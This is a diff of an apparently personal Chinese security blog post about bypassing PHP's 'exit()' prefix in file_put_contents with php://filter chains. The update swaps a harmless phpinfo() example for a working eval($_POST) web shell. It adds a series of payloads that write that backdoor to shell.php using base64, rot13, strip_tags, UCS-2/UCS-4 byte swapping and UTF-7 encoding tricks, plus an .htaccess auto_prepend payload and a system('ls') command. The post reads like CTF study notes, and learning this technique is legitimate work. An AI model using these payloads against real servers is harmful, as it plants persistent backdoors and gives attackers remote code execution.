@@ -42,10 +42,23 @@
 <meta property="og:site_name" content="达达">
 <meta property="og:description" content="php死亡exit()绕过需要绕过exit()的地方一般都是file_put_contents 大致有如下三种 123file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);file_put">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250425092117679.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250425093205021.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250402074843701.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250424205721714.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250425094712088.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250424205850357.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250424205821568.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250424210415023.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250424211105002.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250424211120125.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250425084909300.png">
+<meta property="og:image" content="http://csd0617.github.io/picture/image-20250424215832997.png">
 <meta property="article:published_time" content="2025-04-14T02:56:00.000Z">
-<meta property="article:modified_time" content="2025-04-14T15:51:00.912Z">
+<meta property="article:modified_time" content="2025-04-25T05:35:55.560Z">
 <meta property="article:author" content="达达">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://csd0617.github.io/picture/image-20250425092117679.png">
   
   
     <link rel="alternate" href="/atom.xml" title="达达" type="application/atom+xml">
@@ -207,7 +220,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">php死亡exit()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.1.</span> <span class="toc-text">第一种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">过滤器嵌套绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htaccess%E7%9A%84%E9%A2%84%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%EF%BC%88%E6%9C%AC%E5%9C%B0%E6%B2%A1%E6%9C%89%E6%88%90%E5%8A%9F%EF%BC%8C%E6%88%91%E8%AE%B0%E5%BE%97%E6%88%91%E4%B9%8B%E5%89%8D%E6%88%90%E5%8A%9F%E8%BF%87%E4%B8%80%E6%AC%A1%E5%95%8A-%E5%A5%87%E6%80%AA%EF%BC%89"><span class="toc-number">1.0.1.3.</span> <span class="toc-text">.htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊  奇怪）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.2.</span> <span class="toc-text">第二种情况</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">rot13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#convert-iconv-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">convert.iconv.*过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-2"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">USC-2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#USC-4"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">USC-4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8utf-8%E8%BD%AC%E4%B8%BAutf-7"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">使用utf-8转为utf-7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">组合拳</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80"><span class="toc-number">1.0.2.6.1.</span> <span class="toc-text">一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C"><span class="toc-number">1.0.2.6.2.</span> <span class="toc-text">二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89"><span class="toc-number">1.0.2.6.3.</span> <span class="toc-text">三</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%83%85%E5%86%B5"><span class="toc-number">1.0.3.</span> <span class="toc-text">第三种情况</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -297,7 +310,7 @@
       <div class="article-date">
   <span class="article-date-link" data-aos="zoom-in">
     <time datetime="2025-04-14T02:56:00.000Z" itemprop="datePublished">2025-04-14</time>
-    <time style="display: none;" id="post-update-time">2025-04-14</time>
+    <time style="display: none;" id="post-update-time">2025-04-25</time>
   </span>
 </div>
 
@@ -315,13 +328,12 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br><span class="line">file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);</span><br></pre></td></tr></table></figure>
 
 <p><strong>tips：伪协议处理时会对过滤器urldecode一次；面对不可用的规则是报个Warning，然后跳过继续执行</strong></p>
-<h3 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+<h3 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
 
-<p>base64编码绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/convert.base64-decode/resource=shell.php</span><br><span class="line">content=aPD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+<h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/convert.base64-decode/resource=shell.php</span></span><br><span class="line">content=aPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg==</span><br></pre></td></tr></table></figure>
 
-<p>利用php:&#x2F;&#x2F;filter 伪协议  先将  &lt;?php exit();”.$content   也就是  &lt;?php exit();aPD9waHAgcGhwaW5mbygpOz8+  内容解码后再写入  shell.php  文件中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;`base64编码后为`PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
+<p>利用php:&#x2F;&#x2F;filter 伪协议  先将  &lt;?php exit();”.$content   也就是  &lt;?php exit();aPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs&#x2F;Pg&#x3D;&#x3D;  内容解码后再写入  shell.php  文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;`base64编码后为`PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg==</span><br></pre></td></tr></table></figure>
 
 <p>前面加个a的原因是base64解码以4个字节为1组转换为3个字节</p>
 <p>前面的&lt;?php exit(); 符合base64编码的只有phpexit这七个字节，因此添加一个字节来满足编码</p>
@@ -344,57 +356,157 @@
 
 所以base解码并不会识别<?  空格  ;  也就是只有七个字节需要加一个字节来凑一下  使其满足编码
 
-解码 <?php exit();aPD9waHAgcGhwaW5mbygpOz8+ 的结果
+解码 <?php exit();aPD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg== 的结果
 
-![image-20250402073407130](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250402073407130.png)
-
-rot13编码绕过
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/convert.string.rot13/resource=shell.php</span><br><span class="line">content=&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>
-
-原理同上  因为rot13编码不用考虑前面的字符长度，更为方便
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit();&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>
-
-解码结果    
-
-![image-20250402073842578](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250402073842578.png)
-
-但有局限性，如果开启了短标签的话，前面内容就会解析，导致代码错误
-
-过滤器嵌套绕过
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span><br><span class="line">content=?&gt;PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>
-
-string.strip_tags 可以过滤掉html标签和php标签里的内容  然后再进行base64解码
-
-![image-20250402074843701](C:\Users\csdd\AppData\Roaming\Typora\typora-user-images\image-20250402074843701.png)
-
-第一行为执行strip_tags的结果
-
-第二行对strip_tags执行的结果进行base64解码
-
-需要注意的是`string.strip_tags`在php7.3.0以上的环境下会发生段错误，从而导致无法写入，php5则不受影响
-
-另外一种payload
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=shell.php</span><br><span class="line">content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=shell.php</span><br></pre></td></tr></table></figure>
-
-先进行压缩，再转小写，再解压，最后可以非常巧合的发现目的代码并没有发生改变
-
-### 第二种情况
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+![image-20250425090647726](../picture/image-20250425090647726.png)
 
 #### rot13编码绕过
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/string.rot13/resource=shell.php</span><br><span class="line">content=&lt;?cuc @riny($_CBFG[furyy]);?&gt;</span><br></pre></td></tr></table></figure>
 
-结果如下
+原理同上  因为rot13编码不用考虑前面的字符长度，更为方便
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit();&lt;?cuc @riny($_CBFG[furyy]);?&gt;</span><br></pre></td></tr></table></figure>
+
+解码结果    
+
+![image-20250425124011961](../picture/image-20250425124011961.png)
+
+但有局限性，如果开启了短标签的话，前面内容就会解析，导致代码错误
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[shell]);?&gt;-&gt;&lt;?cuc @riny($_CBFG[furyy]);?&gt;</span><br></pre></td></tr></table></figure>
+
+通过string.rot13过滤器解码后的结果为\<?php @eval();?>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$encoded = &quot;&lt;?php exit();php://filter/string.rot13|&lt;?php exit();&lt;?cuc @riny($_CBFG[furyy]);?&gt;|/resource=shell.php&quot;;</span><br><span class="line">$decoded = str_rot13($encoded);</span><br><span class="line">echo $decoded;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250425092117679.png" alt="image-20250425092117679"></p>
+<p>原因：</p>
+<p>这是因为 <strong><code>string.rot13</code></strong> 只是对字符串进行 <strong>逐字符的字母轮换</strong>，它不会智能地还原原始结构。</p>
+<p>当你看到的“解码结果”是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>这是因为解码过程中 <code>$_CBFG[furyy]</code> 变成了 <code>$_POST[shell]</code> 被过滤掉了！</strong></p>
+<p>大多数模板或过滤器系统（比如 Jinja2 的 <code>&#123;&#123; "..."|rot13 &#125;&#125;</code>）<strong>对变量引用是不支持或被转义的</strong>，因此：</p>
+<ul>
+<li>你原始 ROT13 编码后得到的：<br> <code>&lt;?cuc @riny($_CBFG[furyy]);?&gt;</code></li>
+<li>当你使用 <code>rot13</code> 过滤器进行解码时，<br> 字母部分 <code>cuc</code>、<code>riny</code> 会正确变回 <code>php</code>、<code>eval</code>，<br> 但 <code>$_CBFG[furyy]</code> 部分常常被 <strong>模板系统安全机制</strong> 忽略或清洗掉，<br> 所以你最后只看到 <code>&lt;?php @eval();?&gt;</code></li>
+</ul>
+<hr>
+<p>🔎 举个小例子说明：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &quot;&lt;?cuc @riny(\$_CBFG[furyy]);?&gt;&quot; | rot13 &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>理想解码结果是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[shell]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但如果模板系统转义了 <code>\$_CBFG[furyy]</code>，只还原字母部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以这里木马不好注入我们直接执行命令就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?cuc flfgrz(&#x27;yf&#x27;);?&gt;-》&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250425093205021.png" alt="image-20250425093205021"></p>
+<h4 id="过滤器嵌套绕过"><a href="#过滤器嵌套绕过" class="headerlink" title="过滤器嵌套绕过"></a>过滤器嵌套绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span><br><span class="line">content=?&gt;PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>string.strip_tags 可以过滤掉html标签和php标签里的内容  然后再进行base64解码</p>
+<p><img src="/../picture/image-20250402074843701.png" alt="image-20250402074843701"></p>
+<p>第一行为执行strip_tags的结果</p>
+<p>第二行对strip_tags执行的结果进行base64解码</p>
+<p>需要注意的是<code>string.strip_tags</code>在php7.3.0以上的环境下会发生段错误，从而导致无法写入，php5则不受影响</p>
+<h4 id="htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊-奇怪）"><a href="#htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊-奇怪）" class="headerlink" title=".htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊  奇怪）"></a>.htaccess的预包含利用（本地没有成功，我记得我之前成功过一次啊  奇怪）</h4><p>自定义包含flag文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/write=string.strip_tags/resource=.htaccess</span><br><span class="line">content=?&gt;php_value auto_prepend_file /flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250424205721714.png" alt="image-20250424205721714"></p>
+<p>直接base64不行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下base64编码是以 <code>=</code> 作为结尾的，所以正常解码的时候到了 <code>=</code> 就解码结束了</p>
+<h4 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h4><p>rot13编码就不存在base64的问题，所以和前面base64构造的思路一样👇</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/write=string.rot13|&lt;?cuc @riny($_CBFG[furyy]);?&gt;|/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250425094712088.png" alt="image-20250425094712088"></p>
+<p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag（再补充一下，linux下默认是没有开启的））</p>
+<h4 id="convert-iconv-过滤器"><a href="#convert-iconv-过滤器" class="headerlink" title="convert.iconv.*过滤器"></a>convert.iconv.*过滤器</h4><p>convert.iconv.*过滤器等同于用<code>iconv()</code>函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.源编码.目标编码/resource=文件名</span><br></pre></td></tr></table></figure>
+
+<p>其中的 <code>convert.iconv.XXX.YYY</code> 实际就是调用了 <code>iconv()</code> 函数，将文件内容按编码转换。</p>
+<h4 id="USC-2"><a href="#USC-2" class="headerlink" title="USC-2"></a>USC-2</h4><p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[1234]);?&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTS1[32]4;)&gt;?/resource=shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上）</p>
+<p>利用 UCS-2LE -&gt; UCS-2BE 的反转特性</p>
+<p>UCS-2LE 和 UCS-2BE：</p>
+<ul>
+<li><strong>UCS-2LE</strong> 是 UCS-2 的 <strong>Little Endian（小端序）</strong> 编码</li>
+<li><strong>UCS-2BE</strong> 是 UCS-2 的 <strong>Big Endian（大端序）</strong> 编码</li>
+</ul>
+<p>如果你将一段 UCS-2LE 编码的文本转为 UCS-2BE，本质上就是 <strong>每两个字节换个位置</strong>。</p>
+<p>举个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串 <span class="string">&quot;A&quot;</span> 的 UCS-<span class="number">2</span>LE 表示： <span class="number">0x41</span> <span class="number">0x00</span></span><br><span class="line">转成 UCS-<span class="number">2</span>BE 后变成：         <span class="number">0x00</span> <span class="number">0x41</span></span><br></pre></td></tr></table></figure>
+
+<p>因此，我们就可以通过“构造 UCS-2LE 编码的文件内容”，再通过流包装器转成 UCS-2BE，最终得到我们想要的 payload。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[1234]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>执行结果是   ?&lt;hp pe@av(l_$OPTS1[32]4;)&gt;?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?content=php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTS1[32]4;)&gt;?/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>写入之后是</p>
+<p><img src="/../picture/image-20250424205850357.png" alt="image-20250424205850357"></p>
+<p>这种也是可以成功执行&lt;?php @eval($_POST[1234]);?&gt;这一串php代码的</p>
+<p><img src="/../picture/image-20250424205821568.png" alt="image-20250424205821568"></p>
+<h4 id="USC-4"><a href="#USC-4" class="headerlink" title="USC-4"></a>USC-4</h4><p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-4LE&quot;</span>,<span class="string">&quot;UCS-4BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[1234]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
 
 
-如果`rot`被过滤了的话可以考虑二次编码
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#x27;&lt;?php @eval($_POST[1234]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hp?&lt;e@ p(lavOP_$1[TS]432&gt;?;)</span><br></pre></td></tr></table></figure>
+
+<p>这个跟上面usc-2是一样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$1[TS]432&gt;?;)/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250424210415023.png" alt="image-20250424210415023"></p>
+<h4 id="使用utf-8转为utf-7"><a href="#使用utf-8转为utf-7" class="headerlink" title="使用utf-8转为utf-7"></a>使用utf-8转为utf-7</h4><p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;utf-7&quot;</span>,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;utf-7&quot;</span>,<span class="string">&quot;utf-8&quot;</span>,<span class="string">&#x27;+AD0-&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>=</code>转化为了<code>+AD0-</code>，因此可以结合base64来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(&quot;utf-8&quot;,&quot;utf-7&quot;,&#x27;=&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：+AD0-</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[123456789]);?&gt;base64后为PD9waHAgQGV2YWwoJF9QT1NUWzEyMzQ1Njc4OV0pOz8+，utf-7后为PD9waHAgQGV2YWwoJF9QT1NUWzEyMzQ1Njc4OV0pOz8+</span><br></pre></td></tr></table></figure>
+
+<p>最终payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|aaaaaaPD9waHAgQGV2YWwoJF9QT1NUWzEyMzQ1Njc4OV0pOz8+|/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250424211105002.png" alt="image-20250424211105002"></p>
+<p><img src="/../picture/image-20250424211120125.png" alt="image-20250424211120125"></p>
+<h4 id="组合拳"><a href="#组合拳" class="headerlink" title="组合拳"></a>组合拳</h4><h5 id="一"><a href="#一" class="headerlink" title="一"></a>一</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=Cyc1e.php; #同样需要补位，这里补了一个x</span><br></pre></td></tr></table></figure>
+
+<h5 id="二"><a href="#二" class="headerlink" title="二"></a>二</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php&#x27;; #base64编码前补了AA，原理一样，补齐位数</span><br></pre></td></tr></table></figure>
+
+<p>转码后的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UTF-8:php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php</span><br><span class="line">👇</span><br><span class="line">UTF-7:php://filter/convert.iconv.utf-8.utf-7+AHw-convert.base64-decode+AHw-AAPD9waHAgcGhwaW5mbygpOz8+-/resource+AD0-Cyc1e.php</span><br></pre></td></tr></table></figure>
+
+<p>这样就成功的把 <strong>&#x3D;</strong> 给转了，base64编码没有受到影响，一样可以正常的解码~</p>
+<p>所以对于base64的运用，只要找到一个能把 <strong>&#x3D;</strong> 转了同时又不影响base64编码后的字符的转码方式即可</p>
